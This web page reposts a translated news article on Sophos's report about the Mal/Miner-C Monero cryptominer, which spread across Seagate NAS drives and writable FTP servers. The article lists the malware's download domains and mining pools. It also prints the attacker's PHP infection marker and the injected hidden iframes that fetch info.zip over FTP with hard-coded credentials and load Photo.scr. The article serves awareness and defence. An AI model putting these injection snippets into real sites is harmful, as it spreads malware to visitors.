<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Cryptomineer infected thousands of NAS worldwide, mines about 428 euros per day</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="With the advent of Bitcoin, hidden installation of crypto miners on other PCs has become a great business. But he quickly began to decline with the in...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Cryptomineer infected thousands of NAS worldwide, mines about 428 euros per day</h1><div class="post__text post__text-html js-mediator-article">  With the advent of Bitcoin, hidden installation of crypto miners on other PCs has become a great business.  But he quickly began to decline with the increasing complexity of mining.  Since about 2013, mining on a CPU and even on a GPU has become an <a href="http://theconversation.com/bitcoin-mining-is-about-to-become-a-lot-less-profitable-58302">almost useless exercise</a> , everyone switched to ASIC. <br><br><img src="https://habrastorage.org/files/543/9fd/7b3/5439fd7b3a714403828ebb7ab3e9db26.png"><br>  <i>The increase in the complexity of mining Bitcoin from June 2013 to September 2016, the <a href="http://www.coindesk.com/data/bitcoin-mining-difficulty-time/">schedule of</a> CoinDesk</i> <br><br>  It would seem that it is time for attackers to abandon malicious programs with cryptomines and switch to extortionists (ransomware).  Many have done so.  But then new cryptocurrencies appeared on the scene - and the old business model became effective again. <br><a name="habracut"></a><br>  Experts from the antivirus company Sophos Labs <a href="https://www.sophos.com/en-us/medialibrary/PDFs/technical%2520papers/Cryptomining-malware-on-NAS-servers.pdf">talk</a> about a new cryptomaner that infects Internet-connected network drives (NAS). 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      Malware specializes in mining relatively new cryptocurrency <a href="https://en.wikipedia.org/wiki/Monero_(cryptocurrency)">Monero</a> (XMR).  This is not the only new currency with little difficulty, but for some reason, the attackers have chosen it. <br><br>  As <a href="http://www.coinwarz.com/difficulty-charts/monero-difficulty-chart">can be seen on the graph</a> , the complexity of mining Monero has remained fairly stable for a long time.  It increased sharply only in September, after the publication of the Sophos report on the detected malware.  More users have learned about Monero, so its popularity has grown somewhat (an amendment: the increase in the complexity and the growth rate of Monero could have been caused by <a href="https://geektimes.ru/post/280308/">other reasons</a> ). <br><br>  But at the time when the crypto liner was spreading through Seagate network drives, the mining complexity remained at about the same level. <br><br><img src="https://habrastorage.org/files/8fe/4a3/37b/8fe4a337b4fc447fb9f9e8f48d044644.png"><br>  <i>Monero mining mining growth from June 2016 to September 2016, CoinWarz <a href="http://www.coinwarz.com/difficulty-charts/monero-difficulty-chart">schedule</a></i> <br><br><h3>  Mal / Miner-C </h3><br>  Specialists of the antivirus company say that Mal / Miner-C malware is constantly maintained and is still active.  Its authors are consistently releasing new versions, but all these versions are made using the <a href="http://nsis.sourceforge.net/Main_Page">Nullsoft Scriptable Install System</a> (NSIS) installation program creation system. <br><br>  There are several miner versions in the installation kit for CPU and GPU, as well as for 32-bit and 64-bit versions of Windows. <br><br><img src="https://habrastorage.org/files/f0a/4f1/2b2/f0a4f12b25514376a4bba7d827fb6355.png"><br><br>  The malware checks the system version and adds the corresponding executable file to AutoRun. <br><br>  The latest versions of the NSIS script are downloaded from the following hosts: <br><br><ul><li>  stafftest.ru </li><li>  hrtests.ru </li><li>  profetest.ru </li><li>  testpsy.ru </li><li>  pstests.ru </li><li>  qptest.ru </li><li>  prtests.ru </li><li>  jobtests.ru </li><li>  iqtesti.ru </li></ul><br>  Among other things, in the downloadable document the mining pool is indicated where the work results should be sent. <br><br><pre><code class="hljs ruby">stratum+<span class="hljs-symbol"><span class="hljs-symbol">tcp:</span></span>/<span class="hljs-regexp"><span class="hljs-regexp">/mine.moneropool.com:3333 stratum+tcp:/</span></span><span class="hljs-regexp"><span class="hljs-regexp">/xmr.hashinvest.net:1111 stratum+tcp:/</span></span><span class="hljs-regexp"><span class="hljs-regexp">/monero.crypto-pool.fr:3333 stratum+tcp:/</span></span><span class="hljs-regexp"><span class="hljs-regexp">/mine.cryptoescrow.eu:3333</span></span></code> </pre> <br>  The wallets to which the mining pool transfers rewards are also known. <br><br>  This crypto trojan is interesting in that it tries to spread like a worm.  By infecting one system, it tries to copy itself via FTP to randomly generated IP addresses with standard usernames and passwords.  Once on the FTP server, the worm modifies files with the .htm and .php extensions, inserting frames from which it is suggested to upload the <i>Photo.scr</i> and <i>info.zip files</i> .  When you open a web page in front of the user, the "Save As ..." dialog appears. <br><br><img src="https://habrastorage.org/files/934/de2/94c/934de294cfb44d8281261de1893ee2b4.png"><br><br><h3>  Seagate NAS Network Storage Infection </h3><br>  While searching for systems infected with Mal / Miner-C, the researchers discovered something unusual.  They found that many systems were infected with a file called <b>w0000000t.php</b> . <br><br>  The file contains a line <br><br><pre> <code class="hljs xml"><span class="php"><span class="hljs-meta"><span class="php"><span class="hljs-meta">&lt;?php</span></span></span><span class="php"> </span><span class="hljs-keyword"><span class="php"><span class="hljs-keyword">echo</span></span></span><span class="php"> base64_decode(</span><span class="hljs-string"><span class="php"><span class="hljs-string">"bm9wZW5vcGVub3Bl"</span></span></span><span class="php">); </span><span class="hljs-meta"><span class="php"><span class="hljs-meta">?&gt;</span></span></span></span></code> </pre> <br>  If the system is successfully infected, a request to this file returns the answer: <br><br><pre> <code class="hljs">nopenopenope</code> </pre> <br>  Knowing about the compromised device, a frame with Mal / Miner-C was later installed there: <br><pre> <code class="hljs xml"><span class="php"><span class="hljs-meta"><span class="php"><span class="hljs-meta">&lt;?php</span></span></span><span class="php"> </span><span class="hljs-keyword"><span class="php"><span class="hljs-keyword">echo</span></span></span><span class="php"> base64_decode(</span><span class="hljs-string"><span class="php"><span class="hljs-string">"bm9wZW5vcGVub3Bl"</span></span></span><span class="php">); </span><span class="hljs-meta"><span class="php"><span class="hljs-meta">?&gt;</span></span></span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">ftp://ftp:shadow@196.xxx.xxx.76//info.zip</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">1</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">1</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">frameborder</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">0</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">src</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">Photo.scr</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">width</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">1</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">height</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">1</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">frameborder</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">0</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">iframe</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br>  During the first six months of 2016, the antivirus company was able to identify 1,702,476 infected devices at 3150 IP addresses. <br><br>  As it turned out, among the various network storage (NAS) Seagate Central NAS was the most affected. <br><br><img src="https://habrastorage.org/files/890/396/fab/890396fab56f46b9b8971b39f6a6481f.jpg"><br><br>  This online storage has private (closed) and open folders.  Interestingly, by default, files are written to an open folder, and the account cannot be deleted or deactivated.  From the admin account, you can activate remote access to the device, and then all accounts are available for remote access, including anonymous access.  This is what attackers use to write their <i>Photo.scr</i> and <i>info.zip</i> files to the network storage. <br><br><img src="https://habrastorage.org/files/7ce/ff7/b85/7ceff7b852014b5a91f714d3b4b6c7d3.png"><br><br>  You can get rid of such a threat if you disable remote access to the device, but then the user will lose the ability to stream content via the Internet and other useful network storage functions. <br><br>  Knowing the wallets of the attackers, the experts of the antivirus company studied the history of transactions. <br><br>  For example, here is a screenshot with the amount of payments to one of their wallets: 4912.4 XMR. <br><br><img src="https://habrastorage.org/files/7c0/c07/542/7c0c075421cf40309da2461033f74afd.png"><br><br>  According to Sophos, the entire mining pool paid the guys (probably from Russia) 58,577 XMR.  At the time of calculating the rate of XMR to the euro was 1.3 EUR for 1 XMR, that is, they earned about 76,599 euros, and still earn about <b>428 euros per day</b> .  Not bad for Russian students, if the scholarship is not enough for life. <br><br>  Monero cryptocurrency is not particularly affected by intruders: infected machines generate only 2.5% of the total hashrate. <br><br>  To assess the prevalence of malware, experts examined the status of FTP servers on the Internet.  So, the search system <a href="https://www.censys.io/">Census</a> gives out 2,137,571 open FTP servers, of which 207,110 allow anonymous remote access, and 7,263 allow recording.  So, 5137 of these 7263 servers were infected with Mal / Miner-C, that is, about 70% of all writable FTP servers. <br><br><img src="https://habrastorage.org/files/2c6/376/dd6/2c6376dd60f840458b7118f1bdce7bad.png"><br><br>  If you think that you and your modest network drive are not interested in the criminal world, then there is a strong reason to think again. </div><p>Source: <a href="https://habr.com/ru/post/397529/">https://habr.com/ru/post/397529/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../397509/index.html">The immense scale of being. Part 2, ‚ÄúHitchhiker's Guide to the Universe‚Äù</a></li>
<li><a href="../397511/index.html">Ask Ethan # 92: Is there a limit on the maximum temperature?</a></li>
<li><a href="../397513/index.html">The history of supernovae - fireworks of our galaxy!</a></li>
<li><a href="../397519/index.html">Power 9: Details about processors on the new architecture from IBM</a></li>
<li><a href="../397521/index.html">Quiz for bots on Twitch.tv</a></li>
<li><a href="../397531/index.html">Physics in the animal world: the toucan and its beak</a></li>
<li><a href="../397533/index.html">With whom our ancestors fought and slept</a></li>
<li><a href="../397535/index.html">Composite video output for the Atari 2600 Jr</a></li>
<li><a href="../397537/index.html">Overview of the Draytek 2925 Series Router. Part Two</a></li>
<li><a href="../397539/index.html">Zonal amplifier for smart home alerts</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>